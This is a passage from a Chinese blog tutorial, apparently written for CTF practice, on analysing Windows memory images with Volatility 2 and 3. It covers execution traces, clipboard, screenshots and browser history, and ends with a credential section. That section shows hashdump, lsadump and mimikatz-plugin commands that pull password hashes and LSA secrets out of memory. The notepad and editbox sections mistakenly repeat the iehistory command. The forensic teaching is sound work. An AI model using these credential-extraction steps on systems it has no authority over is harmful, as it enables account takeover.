&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250704134021193.png&#34; alt=&#34;image-20250704134021193&#34; style=&#34;zoom: 50%;&#34; /&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Registry：...\ntuser.dat&lt;/code&gt;&lt;/strong&gt;：个人注册表配置文件，用户为Alissa Simpson&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;REG_BINARY&lt;/code&gt;&lt;/strong&gt;：程序名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Count&lt;/code&gt;&lt;/strong&gt;：程序启动次数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Focus Count&lt;/code&gt;&lt;/strong&gt;：程序点击次数（焦点）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Last Update&lt;/code&gt;&lt;/strong&gt;：最后一次使用记录&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3-22&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.registry.userassist.UserAssist
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250715113900449.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250715113900449&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看程序准备记录shimcacheshimcachemem&#34;&gt;查看程序准备记录（shimcache/shimcachemem）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;记录任何准备执行的程序（包括后台服务、被浏览的文件等，不一定真的运行了）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它甚至能记录已被删除的程序的执行痕迹&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility2-23&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; shimcache
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250715124707154.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250715124707154&#34;
	
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-23&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.shimcachemem.ShimcacheMem
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250715124236951.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250715124236951&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看剪贴板内容clipboard&#34;&gt;查看剪贴板内容（clipboard）
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; clipboard
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;除了使用volatility2之外，也可以查看&lt;code&gt;ActivitiesCache.db&lt;/code&gt;数据库&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;从Windows10版本1803开始，&lt;code&gt;ActivitiesCache.db&lt;/code&gt;就开始记录剪贴板活动了，不过前提是要打开下面的设置：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250715200841039.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250715200841039&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;随后，在下面的路径找到&lt;code&gt;ActivitiesCache.db&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:&lt;span style=&#34;color:#98c379&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#98c379&#34;&gt;\&amp;lt;&lt;/span&gt;username&amp;gt;&lt;span style=&#34;color:#98c379&#34;&gt;\A&lt;/span&gt;ppData&lt;span style=&#34;color:#98c379&#34;&gt;\L&lt;/span&gt;ocal&lt;span style=&#34;color:#98c379&#34;&gt;\C&lt;/span&gt;onnectedDevicesPlatform&lt;span style=&#34;color:#98c379&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用数据库链接后，使用它自带的&lt;code&gt;SmartLookup&lt;/code&gt;视图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250715200733649.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250715200733649&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这里我的ClipboardPayload字段为空，是因为我没有打开剪贴板历史记录，嘻嘻&lt;/p&gt;
&lt;h3 id=&#34;查看窗口图像screeenshot&#34;&gt;查看窗口图像（screeenshot）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;从内存中提取窗口图像甚至恢复桌面画面，截图内容通常是窗口的客户区域，不是全屏桌面&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;需要安装Pillow库：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;source&lt;/span&gt; /home/kali/volatility2/venv_volatility2/bin/activate
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip2 install Pillow
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;deactivate
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;使用的同时必须指定保存路径（&amp;ndash;dump-dir=）&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; screenshot --dump-dir&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;保存路径
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706225854144.png&#34; alt=&#34;image-20250706225854144&#34; style=&#34;zoom: 67%;&#34; /&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;文件名&lt;/th&gt;
          &lt;th&gt;含义&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;session_0&lt;/td&gt;
          &lt;td&gt;会话 0，表示本地物理桌面用户或服务（如 SYSTEM）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;WinSta0&lt;/td&gt;
          &lt;td&gt;用户交互的窗口站（Window Station），默认GUI桌面就在这里&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Default&lt;/td&gt;
          &lt;td&gt;当前活动桌面&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Winlogon&lt;/td&gt;
          &lt;td&gt;登录界面桌面，可能在锁屏状态时显示&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Disconnect&lt;/td&gt;
          &lt;td&gt;断开连接时显示的桌面（比如远程桌面断开）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Service-0x0-3e7$&lt;/td&gt;
          &lt;td&gt;代表SYSTEM服务账户的窗口站&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mssrestricteddesk&lt;/td&gt;
          &lt;td&gt;某些安全子系统（如 Speech 或 Office 隔离）的沙盒桌面&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;比如我这里获得的一张当时的屏幕截图&lt;code&gt;session_2.WinSta0.Default.png&lt;/code&gt;，说明用户在查看一张图片：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250715204836602.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250715204836602&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;图片名base64解码就是flag：&lt;code&gt;flag{!!_w3LL_d0n3_St4g3-1_0g_L4B_5_D0n3_!!}&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看记事本中的内容notepad&#34;&gt;查看记事本中的内容（notepad）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;本质是扫描记事本进程&lt;code&gt;notepad.exe&lt;/code&gt;，还原的是正在显示和编辑的内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; iehistory
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;查看用户可能编辑的内容editbox&#34;&gt;查看用户可能编辑的内容（editbox）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;它比&lt;code&gt;notepad&lt;/code&gt;插件更加通用，不只针对记事本，而是扫描所有进程的内存，寻找所有编辑控件并提取文本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; iehistory
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;查看ie浏览器历史记录iehistory&#34;&gt;查看ie浏览器历史记录（iehistory）
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; iehistory
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;查看chrome浏览器历史记录chromehistory&#34;&gt;查看chrome浏览器历史记录（chromehistory）
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;需要下载插件&lt;code&gt;chromehistory&lt;/code&gt;和&lt;code&gt;sqlite_help&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/superponible/volatility-plugins/blob/master&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/superponible/volatility-plugins/blob/master
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; chromehistory
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;查看firefox浏览器历史记录firefoxhistory&#34;&gt;查看firefox浏览器历史记录（firefoxhistory）
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;需要下载插件&lt;code&gt;firefoxhistory&lt;/code&gt;和&lt;code&gt;sqlite_help&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/superponible/volatility-plugins/blob/master&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/superponible/volatility-plugins/blob/master
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; firefoxhistory
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;根据历史记录，我们可以去内存中查找是否有对应的文件&lt;/strong&gt;：&lt;a class=&#34;link&#34; href=&#34;#%e6%96%87%e4%bb%b6%e6%89%ab%e6%8f%8f%e4%b8%8e%e6%8f%90%e5%8f%96&#34; &gt;文件扫描与提取
    
&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看已安装的软件uninstallinfo&#34;&gt;查看已安装的软件（uninstallinfo）
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;需要下载插件&lt;code&gt;uninstallinfo&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/superponible/volatility-plugins/blob/master&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/superponible/volatility-plugins/blob/master
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; uninstallinfo
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;查看查入系统的usb设备usbstor&#34;&gt;查看查入系统的USB设备（usbstor）
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;需要下载插件&lt;code&gt;usbstor&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/ruokeqx/tool-for-CTF/tree/master/volatility_plugins&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/ruokeqx/tool-for-CTF/tree/master/volatility_plugins
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; usbstor
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;密码和凭证获取仅volatility2&#34;&gt;密码和凭证获取（仅volatility2）
&lt;/h2&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:23px&#34;&gt;&lt;strong&gt;volatility3没有下面的功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;提取本地账户哈希hashdump&#34;&gt;提取本地账户哈希（hashdump）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;使用SYSTEM里面的SYSKEY提取SAM中的密码哈希&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; hashdump
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出格式是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#e06c75&#34;&gt;用户名&lt;/span&gt;]&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt;[&lt;span style=&#34;color:#e06c75&#34;&gt;RID&lt;/span&gt;]&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt;[&lt;span style=&#34;color:#e06c75&#34;&gt;LM哈希&lt;/span&gt;]&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt;[&lt;span style=&#34;color:#e06c75&#34;&gt;NTLM哈希&lt;/span&gt;]&lt;span style=&#34;color:#56b6c2&#34;&gt;:::&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250704120945088.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250704120945088&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;提取lsa密钥lsadump&#34;&gt;提取LSA密钥（lsadump）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;lsa是本地安全机构，通过它可以获取当前登录用户、服务账户等多种形式的凭证，甚至可能是明文密码&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; lsadump
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;以hex转储的形式输出，可能藏有东西&lt;/p&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250704120913200.png&#34; alt=&#34;image-20250704120913200&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;DefaultPassword&lt;/code&gt;&lt;/strong&gt;：系统为自动登录功能存储的密码，如果设置了就是对应用户的密码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;NL$KM&lt;/code&gt;&lt;/strong&gt;：计算机的密钥，用于计算机和域控制器之间进行安全的通信和认证&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;DPAPI_SYSTEM&lt;/code&gt;&lt;/strong&gt;：系统级DPAPI的主密钥，用于解密用户保存的各种密码（浏览器里的、wifi密码等）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;提取明文密码mimikatz&#34;&gt;提取明文密码（mimikatz）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;实际上也是从lsass.exe里面提取，是lsadump的特化&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;非官方插件，需要下载：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://raw.githubusercontent.com/volatilityfoundation/community/master/FrancescoPicasso&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://raw.githubusercontent.com/volatilityfoundation/community/master/FrancescoPicasso
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;还需要安装依赖，必须是对应旧版本的&lt;code&gt;construct&lt;/code&gt;库：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;source&lt;/span&gt; /home/kali/volatility2/venv_volatility2/bin/activate
